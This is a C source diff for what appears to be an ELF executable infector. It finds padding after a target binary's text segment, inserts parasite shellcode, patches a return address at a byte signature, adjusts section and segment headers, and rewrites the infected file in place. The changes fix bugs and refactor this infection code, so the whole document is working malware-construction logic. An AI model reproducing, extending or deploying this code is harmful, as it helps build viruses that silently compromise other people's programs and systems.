@@ -21,8 +21,8 @@ static int shellcode_patch_ret_address(struct Shellcode *this,  \
 {
     for(int i = 0; i < this->m_shellcode_size; i++){
         printf("shellcode %x\n", this->m_shellcode[i]);
-        if(this->m_shellcode[i] == 0x55 && this->m_shellcode[i  \
-            + 1] == 0x99){
+        if(this->m_shellcode[i] == 0x99 && this->m_shellcode[i  \
+            + 1] == 0x55){
 
 #ifdef DEBUG
             printf("signature found\n");
@@ -35,8 +35,8 @@ static int shellcode_patch_ret_address(struct Shellcode *this,  \
             sprintf(buffer, "%lx", addr);
 #endif
 
-            for(int j = 0; j < 16; j++, i++){
-                printf("%d\t%d\n", this->m_shellcode[i], buffer[i]);
+            for(int j = 0; j < 16 && i < this->m_shellcode_size \
+                    ; j++, i++){
                 this->m_shellcode[i] = buffer[j];
             }
             return 0;
@@ -62,7 +62,7 @@ static int shellcode_extract_section(Shellcode *this, int index)
 #ifdef DEBUG
         fprintf(stderr, "memory allocation failed\n");
 #endif
-        goto err1;
+        return -1;
     }
 
     memset(this->m_shellcode, 0, this->m_shellcode_size);
@@ -70,10 +70,10 @@ static int shellcode_extract_section(Shellcode *this, int index)
             m_elf->m_shdr[index].sh_offset], this->m_elf->m_shdr\
             [index].sh_size);
 
-    return 0;
+    /* probably unmap elf `\()/` */
+    this->m_elf->RemoveMap(this->m_elf);
 
-err1:
-    return -1;
+    return 0;
 }
 
 
@@ -83,6 +83,7 @@ static int target_save_file(Target *this)
     if(remove(this->m_elf->m_filename) < 0)
         goto err;
 
+    /* create a new file with the same name */
     int out = open(this->m_elf->m_filename, O_WRONLY | O_CREAT  \
             | O_TRUNC, 0x664);
     if(out < 0){
@@ -97,6 +98,7 @@ static int target_save_file(Target *this)
     ssize_t written = 0;
     void *buffer = this->m_elf->m_map;
 
+    /* write to new file */
     while(size != 0 && (written = write(out, buffer, size))     \
         != 0){
         if(written == -1){
@@ -132,25 +134,16 @@ static void target_insert_shellcode(Target *this, Shellcode     \
 static void target_adjust_sections(Target *this, int parasite_size)
 {
     for(int i = 0; i < this->m_elf->m_ehdr->e_shnum; i++){
-        if(this->m_elf->m_shdr[i].sh_addr > this->parasite_addr){
-            /* 
-             * increase offset of every section after infected one
-             * by PAGE_SIZE
-             */
-            this->m_elf->m_shdr[i].sh_offset += PAGE_SIZE;
-        } else {
-            /* 
-             * if sh_addr + sh_size == parasite_addr, we are at 
-             * .text section. since we havent modified section
-             * header's values such as sh_size, we should do that
-             * now
-             */
-            if(this->m_elf->m_shdr[i].sh_addr + this->m_elf->   \
-                    m_shdr[i].sh_size == this->parasite_addr){
-                this->m_elf->m_shdr[i].sh_size +=               \
-                    parasite_size;
-            }
-        }
+
+        /* 
+         * if sh_addr + sh_size == parasite_addr, we are at 
+         * .text section. since we havent modified section
+         * header's values such as sh_size, we should do that
+         * now
+         */
+        if(this->m_elf->m_shdr[i].sh_addr + this->m_elf->m_shdr \
+                [i].sh_size == this->parasite_addr)
+            this->m_elf->m_shdr[i].sh_size += parasite_size;
     }
 }
 
@@ -180,33 +173,41 @@ static int target_find_free_space(Target *this, int parasite_size)
             this->m_elf->m_phdr[i].p_memsz += parasite_size;
             text_found = true;
 
-        } else if (this->m_elf->m_phdr[i].p_type == PT_LOAD &&  \
-            (this->m_elf->m_phdr[i].p_offset - this->text_end)  \
-            >= parasite_size && text_found){
-            this->available_freespace = this->m_elf->m_phdr[i]. \
-                p_offset - this->text_end;
+        } else {
+            if (this->m_elf->m_phdr[i].p_type == PT_LOAD && (   \
+                    this->m_elf->m_phdr[i].p_offset - this->    \
+                    text_end)>= parasite_size && text_found){
+                this->available_freespace = this->m_elf->m_phdr \
+                    [i].p_offset - this->text_end;
 
 #ifdef DEBUG
-            printf("segment found with a gap of %d\n", this->   \
-                available_freespace);
+                printf("segment found with a gap of %d\n",      \
+                        this->available_freespace);
 #endif
-            text_found = false;
+                text_found = false;
+            }
         }
     }
 
     return 0;
 }
 
+static void elf_remove_map(Elf *this)
+{
+    munmap(this->m_map, this->m_size);
+    this->m_map = NULL;
+}
+
 /* to get the .text section code from our shellcode */
-static int elf_get_section_index_by_name(Elf *elf, const char   \
+static int elf_get_section_index_by_name(Elf *this, const char  \
         *section_name)
 {
     /* first we have to parse shstrtab */
-    Elf64_Shdr *section = &elf->m_shdr[elf->m_ehdr->e_shstrndx];
-    char *shstrtab = (char *)&elf->m_map[section->sh_offset];
+    Elf64_Shdr *section = &this->m_shdr[this->m_ehdr->e_shstrndx];
+    char *shstrtab = (char *)&this->m_map[section->sh_offset];
 
-    for(int i = 0; i < elf->m_ehdr->e_shnum; i++){
-        if(strcmp(&shstrtab[elf->m_shdr[i].sh_name],            \
+    for(int i = 0; i < this->m_ehdr->e_shnum; i++){
+        if(strcmp(&shstrtab[this->m_shdr[i].sh_name],            \
                     section_name) == 0){
             printf("%s section found\n", section_name);
             return i;
@@ -216,18 +217,18 @@ static int elf_get_section_index_by_name(Elf *elf, const char   \
     return -1;
 }
 
-static void elf_parse_headers(Elf *elf)
+static void elf_parse_headers(Elf *this)
 {
-    elf->m_ehdr = (Elf64_Ehdr *) elf->m_map;
-    elf->m_phdr = (Elf64_Phdr *) &elf->m_map[elf->m_ehdr->      \
+    this->m_ehdr = (Elf64_Ehdr *) this->m_map;
+    this->m_phdr = (Elf64_Phdr *) &this->m_map[this->m_ehdr->   \
         e_phoff];
-    elf->m_shdr = (Elf64_Shdr *) &elf->m_map[elf->m_ehdr->      \
+    this->m_shdr = (Elf64_Shdr *) &this->m_map[this->m_ehdr->   \
         e_shoff];
 }
 
-static bool elf_is_elf(Elf *elf)
+static bool elf_is_elf(Elf *this)
 {
-    if(elf->m_map == NULL){
+    if(this->m_map == NULL){
 
 #ifdef DEBUG
         fprintf(stderr, "file not mapped\n");
@@ -235,8 +236,8 @@ static bool elf_is_elf(Elf *elf)
         goto err;
     }
 
-    if(elf->m_map[0] != 0x7f || elf->m_map[1] != 'E' ||         \
-            elf->m_map[2] != 'L' || elf->m_map[3] != 'F'){
+    if(this->m_map[0] != 0x7f || this->m_map[1] != 'E' ||         \
+        this->m_map[2] != 'L' || this->m_map[3] != 'F'){
 
 #ifdef DEBUG
         fprintf(stderr, "not an elf binary\n");
@@ -317,6 +318,7 @@ Elf *ElfConstructor(const char *filename)
     elf->IsElf = elf_is_elf;
     elf->ParseHeaders = elf_parse_headers;
     elf->FindSectionIndexByName = elf_get_section_index_by_name;
+    elf->RemoveMap = elf_remove_map;
 
 err:
     return elf;
@@ -324,14 +326,8 @@ err:
 
 void ElfDestructor(Elf *this)
 {
-    if(this->m_map != NULL){
-        if(munmap(this->m_map, this->m_size) < 0){
-
-#ifdef DEBUG
-            fprintf(stderr, "memory unmap failed\n");
-#endif
-        }
-    }
+    if(this->m_map != NULL)
+        this->RemoveMap(this);
 
     free(this);
 }
@@ -423,6 +419,9 @@ err:
 
 void ShellcodeDestructor(Shellcode *this)
 {
+    /* freeing copy of shellcode */
+    free(this->m_shellcode);
+
     /* remove shellcode files */
     if(remove(this->m_elf->m_filename) < 0){
 
